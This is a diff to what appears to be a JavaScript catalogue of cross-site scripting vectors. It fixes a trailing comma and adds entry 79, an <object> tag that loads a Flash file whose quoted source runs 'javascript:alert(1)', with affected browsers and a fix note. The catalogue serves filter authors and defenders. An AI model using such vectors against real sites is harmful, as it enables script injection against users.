@@ -2367,7 +2367,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'firefox': ['1.5', '2.x', '3.x'],
+            'firefox': ['1.5', '2.x', '3.x']
         },
         'tags'       : ['xss', 'javascript', 'e4x', 'script', 'parser', 'regex'],
         'reporter'   : '.mario, Gareth'
@@ -2472,5 +2472,43 @@ var items =
         },
         'tags'       : ['xss', 'javascript', 'internet explorer', 'xml', 'xdr', 'arbitrary', 'xml data reduced', 'xsl'],
         'reporter'   : 'LeverOne'
+    },
+    { /* ID 79 - <OBJECT> tag and Flash files executing JavaScript */
+        'id'         : 79,
+        'category'   : 'html4', 
+        'name'       : {
+            'en' : '<OBJECT> tag and Flash files executing JavaScript',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '<object data="%swf_path%"></object>',
+        'description': {
+            'en' : '<OBJECT> tags directly including Flash files via the "data" attribute - allowing execution of JavaScript and more without user interaction.',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'attachment' : {
+            'required_mime' : '',
+            'samedomain'    : '0',            
+            'path'          : 'http://heideri.ch/jso/test.swf',
+            'name'          : 'test.swf',
+            'raw'           : 'class XSS {\r\npublic static function main() {\r\nflash.Lib.getURL(new flash.net.URLRequest("javascript:alert(1);"),"_top");\r\n}\r\n}'
+        },        
+        'urls'    : ['http://www.w3.org/TR/REC-html40/struct/objects.html'],
+        'howtofix'   : {
+            'en' : 'Make sure users cannot control the "src" and "data" attribute values of <OBJECT> tags - or better don\'t whitelist <OBJECT> tags in user submitted markup at all.',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'safari': ['3.4', '4.x'],
+            'firefox': ['1.5', '2.x', '3.x'],        
+            'opera': ['10.0', '10.5', 'mobile']
+        },
+        'tags'       : ['xss', 'javascript', 'object', 'flash', 'swf', 'safari', 'firefox', 'opera'],
+        'reporter'   : '.mario'
     }
 ]
